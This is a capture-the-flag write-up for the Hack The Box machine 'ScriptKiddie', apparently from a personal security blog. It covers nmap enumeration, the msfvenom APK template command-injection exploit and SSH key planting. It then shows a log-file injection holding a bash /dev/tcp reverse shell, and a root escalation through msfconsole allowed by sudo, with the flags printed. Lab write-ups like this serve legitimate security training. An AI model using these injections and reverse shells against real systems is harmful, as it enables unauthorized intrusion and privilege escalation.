---
layout: post
title: "ScriptKiddie "
lang: en
categories:
  - writeups
tags:
  - security
  - writeups
  - htb
  - pe
  - linux
  - python
  - web
date: 2021/06/06 15:15:00
thumbnail: /img/HackTheBox/scriptkiddie.png

toc: true
---
# Information



- **Name:** ScriptKiddie
- **Profile:** [www.hackthebox.eu](https://app.hackthebox.eu/machines/314)
- **Difficulty:** Easy
- **OS:** Linux
- **Points:** 20

![ScriptKiddie](/img/HackTheBox/scriptkiddie.png)



## Overview

Install tools used in this WU on BlackArch Linux:

```
$ sudo pacman -S nmap metasploit pwncat
```

Note: IP is different because of release arena (10.10.10.226)

## Network enumeration

Port and service scan with nmap:

```plaintext
# Nmap 7.91 scan initiated Mon Feb  8 19:00:29 2021 as: nmap -sSVC -p- -v -oA nmap_scan 10.129.77.135
Nmap scan report for 10.129.77.135
Host is up (0.029s latency).
Not shown: 65533 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 3c:65:6b:c2:df:b9:9d:62:74:27:a7:b8:a9:d3:25:2c (RSA)
|   256 b9:a1:78:5d:3c:1b:25:e0:3c:ef:67:8d:71:d3:a3:ec (ECDSA)
|_  256 8b:cf:41:82:c6:ac:ef:91:80:37:7c:c9:45:11:e8:43 (ED25519)
5000/tcp open  http    Werkzeug httpd 0.16.1 (Python 3.8.5)
| http-methods:
|_  Supported Methods: POST HEAD GET OPTIONS
|_http-title: k1d'5 h4ck3r t00l5
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Feb  8 19:00:54 2021 -- 1 IP address (1 host up) scanned in 25.42 seconds
```

## Web exploitation

A python web server (Werkzeug) is running at http://10.129.77.135:5000/.

The page is named `k1d'5 h4ck3r t00l5` and allow us to use some commands:

- nmap: nmap
- payloads: msfvenom from metasploit
- sploits: searchploit from exploit-db

On the msfvenom, we have the option to upload a custom template.

But there is a new vulnerability:

> This module exploits a command injection vulnerability in Metasploit
> Framework's msfvenom payload generator when using a crafted APK file
> as an Android payload template. Affects Metasploit Framework <=
> 6.0.11 and Metasploit Pro <= 4.18.0. The file produced by this
> module is a relatively empty yet valid-enough APK file. To trigger
> the vulnerability, the victim user should do the following: msfvenom
> -p android/<...> -x <crafted_file.apk>

```plaintext
msf6 exploit(unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection) > options

Module options (exploit/unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   FILENAME  msf.apk          yes       The APK file name


Payload options (cmd/unix/reverse_netcat):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  tun0             yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port

   **DisablePayloadHandler: True   (no handler will be created!)**


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf6 exploit(unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection) > run

[+] msf.apk stored at /home/cyfun/.msf4/local/msf.apk
```

Then we select `android`, specify our template and set whatever a lhost.

On our machine we just launch a listener:

```plaintext
$ pwncat -l 4444 -vv
INFO: Listening on :::4444 (family 10/IPv6, TCP)
INFO: Listening on 0.0.0.0:4444 (family 2/IPv4, TCP)
INFO: Client connected from 10.129.77.135:43478 (family 2/IPv4, TCP)
id
uid=1000(kid) gid=1000(kid) groups=1000(kid)
```

## System exploitation

Let's see where we are and locate the flag:

```plaintext
$ ls -lhA
total 20K
drwxrwxr-x 2 kid kid 4.0K Feb  3 07:40 __pycache__
-rw-rw-r-- 1 kid kid 4.4K Feb  3 11:03 app.py
drwxrwxr-x 3 kid kid 4.0K Feb  3 07:40 static
drwxrwxr-x 2 kid kid 4.0K Feb  3 07:40 templates

$ pwd
/home/kid/html

$ ls -lhA ..
total 52K
lrwxrwxrwx 1 root kid    9 Jan  5 20:31 .bash_history -> /dev/null
-rw-r--r-- 1 kid  kid  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 kid  kid 3.7K Feb 25  2020 .bashrc
drwxrwxr-x 3 kid  kid 4.0K Feb  3 07:40 .bundle
drwx------ 2 kid  kid 4.0K Feb  3 07:40 .cache
drwx------ 4 kid  kid 4.0K Feb  3 11:49 .gnupg
drwxrwxr-x 3 kid  kid 4.0K Feb  3 07:40 .local
drwxr-xr-x 9 kid  kid 4.0K Feb  3 07:40 .msf4
-rw-r--r-- 1 kid  kid  807 Feb 25  2020 .profile
drwx------ 2 kid  kid 4.0K Feb  3 07:40 .ssh
-rw-r--r-- 1 kid  kid    0 Jan  5 11:10 .sudo_as_admin_successful
drwxrwxr-x 5 kid  kid 4.0K Feb  3 11:03 html
drwxrwxrwx 2 kid  kid 4.0K Feb  3 07:40 logs
drwxr-xr-x 3 kid  kid 4.0K Feb  3 11:48 snap
-r-------- 1 kid  kid   33 Jan  5 20:45 user.txt

$ cat ../user.txt # /home/kid/user.txt
4cbc14d5ba8c34df90ed21bdd840708a
```

## Privilege Escalation of Machine : from kid to pwn

Let's find if there is another user flag:

```plaintext
kid@scriptkiddie:~$ find / -name user.txt -type f 2>/dev/null
/home/kid/user.txt
```

No there isn't. But we can loot kid's private key to have a better shell.

```
$ chmod 600 id_rsa_kid
$ ssh kid@10.129.77.135 -i id_rsa_kid
```

Note: has been patched, there is no longer some ssh key but we can add ours:
`printf %s 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINDGLndVd+2+y7FE7nVTrMtBvPiLNTMgObVw8s7d9B8n cyfun@penarch' >> /home/kid/.ssh/authorized_keys`.

There is another user named `pwn` owning a script: `/home/pwn/scanlosers.sh`.

```bash
#!/bin/bash

log=/home/kid/logs/hackers

cd /home/pwn/
cat $log | cut -d' ' -f3- | sort -u | while read ip; do
    sh -c "nmap --top-ports 10 -oN recon/${ip}.nmap ${ip} 2>&1 >/dev/null" &
done

if [[ $(wc -l < $log) -gt 0 ]]; then echo -n > $log; fi
```

We have write access to `/home/kid/logs/hackers`. We can see that our date and
IP is written to this file when we try to bypass the searchploit function:

`/home/kid/html/app.py`

```python
import datetime
import os
import random
import re
import subprocess
import tempfile
import time
from flask import Flask, render_template, request
from hashlib import md5
from werkzeug.utils import secure_filename


regex_ip = re.compile(r'^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$')
regex_alphanum = re.compile(r'^[A-Za-z0-9 \.]+$')
OS_2_EXT = {'windows': 'exe', 'linux': 'elf', 'android': 'apk'}

app = Flask(__name__)


@app.route('/', methods=['GET','POST'])
def index():
    if request.method == 'GET' or not 'action' in request.form:
        return render_template('index.html')
    elif request.form['action'] == 'scan':
        return scan(request.form['ip'])
    elif request.form['action'] == 'generate':
        return venom(request)
    elif request.form['action'] == 'searchsploit':
        return searchsploit(request.form['search'], request.remote_addr)
    print("no valid action")
    return request.form


def scan(ip):
    if regex_ip.match(ip):
        if not ip == request.remote_addr and ip.startswith('10.10.1') and not ip.startswith('10.10.10.'):
            stime = random.randint(200,400)/100
            time.sleep(stime)
            result = f"""Starting Nmap 7.80 ( https://nmap.org ) at {datetime.datetime.utcnow().strftime("%Y-%m-%d %H:%M")} UTC\nNote: Host seems down. If it is really up, but blocking our ping probes, try -Pn\nNmap done: 1 IP address (0 hosts up) scanned in {stime} seconds""".encode()
        else:
            result = subprocess.check_output(['nmap', '--top-ports', '100', ip])
        return render_template('index.html', scan=result.decode('UTF-8', 'ignore'))
    return render_template('index.html', scanerror="invalid ip")


def searchsploit(text, srcip):
    if regex_alphanum.match(text):
        result = subprocess.check_output(['searchsploit', '--color', text])
        return render_template('index.html', searchsploit=result.decode('UTF-8', 'ignore'))
    else:
        with open('/home/kid/logs/hackers', 'a') as f:
            f.write(f'[{datetime.datetime.now()}] {srcip}\n')
        return render_template('index.html', sserror="stop hacking me - well hack you back")


def venom(request):
    errors = []
    file = None
    if not 'lhost' in request.form:
        errors.append('lhost missing')
    else:
        lhost = request.form['lhost']
        if not regex_ip.match(lhost):
            errors.append('invalid lhost ip')
    if not 'os' in request.form:
        errors.append('os missing')
    else:
        tar_os = request.form['os']
        if tar_os not in ['windows', 'linux', 'android']:
            errors.append(f'invalid os: {tar_os}')
    if 'template' in request.files and request.files['template'].filename != '':
        file = request.files['template']
        if not ('.' in file.filename and file.filename.split('.')[-1] == OS_2_EXT[tar_os]):
            errors.append(f'{tar_os} requires a {OS_2_EXT[tar_os]} ext template file')
        else:
            template_name = secure_filename(file.filename)
            template_ext = file.filename.split('.')[-1]
            template_file = tempfile.NamedTemporaryFile('wb', suffix='.'+template_ext)
            file.save(template_file.name)
    else:
        template_name = "None"

    if errors:
        return render_template('index.html', payloaderror='<br/>\n'.join(errors))

    payload = f'{tar_os}/meterpreter/reverse_tcp'
    outfilename = md5(request.remote_addr.encode()).hexdigest()[:12] + '.' + OS_2_EXT[tar_os]
    outfilepath = os.path.join(app.root_path, 'static', 'payloads', outfilename)

    try:
        if file:
            print(f'msfvenom -x {template_file.name} -p {payload} LHOST={lhost} LPORT=4444')
            result = subprocess.check_output(['msfvenom', '-x', template_file.name, '-p',
                payload, f'LHOST={lhost}', 'LPORT=4444',
                '-o', outfilepath])
            template_file.close()
        else:
            result = subprocess.check_output(['msfvenom', '-p', payload,
                f'LHOST={lhost}', 'LPORT=4444', '-o', outfilepath])
    except subprocess.CalledProcessError:
        return render_template('index.html', payloaderror="Something went wrong")


    return render_template('index.html', payload=payload, lhost=lhost,
            lport=4444, template=template_name, fn=outfilename)


if __name__ == '__main__':
    app.run(host='0.0.0.0')
```

So normally `/home/pwn/scanlosers.sh` will scan us back.

The logs file should contains lines like this one:

```
2021-02-08 19:54:33.513581 1.1.1.1
```

And when we try to "hack" searchploit, it voids the file instead of appending a
new line.

There is `/usr/sbin/incrond` running so there is maybe a root job starting
`/home/pwn/scanlosers.sh` or something similar.

Let's upload and launch pspy to confirm that.

On our machine:

```plaintext
$ wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64
$ ruby -run -ehttpd . -p8080
```

On the target machine:

```plaintext
kid@scriptkiddie:~$ wget http://10.10.14.135:8080/pspy64
kid@scriptkiddie:~$ chmod u+x pspy64
kid@scriptkiddie:~$ ./pspy64
```

If we go trigger the searchsploit security filter we can see this on pspy:

```plaintext
2021/02/08 21:30:37 CMD: UID=1001 PID=2221   | /bin/bash /home/pwn/scanlosers.sh 
2021/02/08 21:30:37 CMD: UID=1001 PID=2225   | /bin/bash /home/pwn/scanlosers.sh 
2021/02/08 21:30:37 CMD: UID=1001 PID=2226   | sh -c nmap --top-ports 10 -oN recon/10.10.14.135.nmap 10.10.14.135 2>&1 >/dev/null 
2021/02/08 21:30:37 CMD: UID=1001 PID=2228   | nmap --top-ports 10 -oN recon/10.10.14.135.nmap 10.10.14.135 
2021/02/08 21:30:37 CMD: UID=1001 PID=2231   | /bin/bash /home/pwn/scanlosers.sh 
2021/02/08 21:30:37 CMD: UID=1001 PID=2237   | /bin/bash /home/pwn/scanlosers.sh 
2021/02/08 21:30:37 CMD: UID=1001 PID=2236   | /bin/bash /home/pwn/scanlosers.sh 
2021/02/08 21:30:37 CMD: UID=0    PID=2238   | /lib/systemd/systemd-udevd 
2021/02/08 21:30:48 CMD: UID=0    PID=2239   | /usr/sbin/incrond 
2021/02/08 21:30:48 CMD: UID=1001 PID=2240   | sed -i s/open  /closed/g /home/pwn/recon/sed6xfScv 
2021/02/08 21:30:48 CMD: UID=0    PID=2241   | /bin/sh /sbin/dhclient-script 
2021/02/08 21:30:48 CMD: UID=???  PID=2243   | ???
```

1001 is the id of `pwn`, so we'll get a shell as pwn.

Let's craft a reverse shell payload and put it in place:

```plaintext
$ printf %s "cyfun cyfun ;/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.135/9999 0>&1' #" > /home/kid/logs/hackers
```

Note: respect the log format else the `cut` in the script will fails to parse

Once injected in `/home/pwn/scanlosers.sh` the command executed by pwn incron
job will be:

```plaintext
nmap --top-ports 10 -oN recon/ ;/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.135/9999 0>&1' #.nmap  ;/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.135/9999 0>&1' # 2>&1 >/dev/null
```

Then we start a listener `pwncat -l 9999 -vv`.

## Privilege Escalation of Machine : from pwn to root

We can root `msfconsole` as root.

```plaintext
pwn@scriptkiddie:~$ sudo -l
Matching Defaults entries for pwn on scriptkiddie:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User pwn may run the following commands on scriptkiddie:
    (root) NOPASSWD: /opt/metasploit-framework-6.0.9/msfconsole
```

It will be EZ because we it's an interpretter where we can directly pass
system commands or open `irb` ruby interpreter.

```plaintext
msf6 > cat /root/root.txt
stty: 'standard input': Inappropriate ioctl for device
[*] exec: cat /root/root.txt

40aa7274fd70bacc2ade0054b081475f
```
